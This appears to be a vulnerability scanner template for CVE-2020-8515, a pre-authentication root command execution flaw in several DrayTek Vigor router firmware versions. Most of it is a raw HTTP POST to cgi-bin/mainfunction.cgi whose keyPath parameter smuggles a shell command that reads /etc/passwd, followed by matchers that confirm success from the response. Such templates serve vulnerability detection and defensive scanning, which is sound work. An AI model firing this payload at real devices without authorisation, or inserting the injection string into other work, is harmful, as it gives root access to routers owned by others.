id: cve-2020-8515
info:
  author: pikpikcu
  description: DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta,
    1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without
    authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI.
    This issue has been fixed in Vigor3900/2960/300B v1.5.1.
  name: DrayTek pre-auth RCE
  reference: '- https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)

    - https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/

    '
  severity: critical
  tags: cve,cve2020,rce
requests:
- matchers:
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /cgi-bin/mainfunction.cgi HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept: */*

    Connection: close


    action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a

    '
